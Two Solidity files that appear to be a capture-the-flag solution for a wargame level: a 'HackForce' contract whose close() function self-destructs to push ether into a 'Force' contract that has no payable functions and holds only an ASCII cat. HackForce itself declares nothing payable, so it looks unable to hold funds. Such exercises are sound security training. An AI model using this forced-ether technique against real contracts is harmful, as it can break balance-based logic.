// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "./Force.sol";

contract HackForce {

  address payable private toSend = payable(0xF7c76375227291b07Ed724f3C312B9029e8bA4fA);
  mapping(address => uint) balances;
  uint public totalSupply;
  Force public originalContract = Force(0xF7c76375227291b07Ed724f3C312B9029e8bA4fA);

  constructor(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }


  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }

  function close() public { 
  selfdestruct(toSend); 
 }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}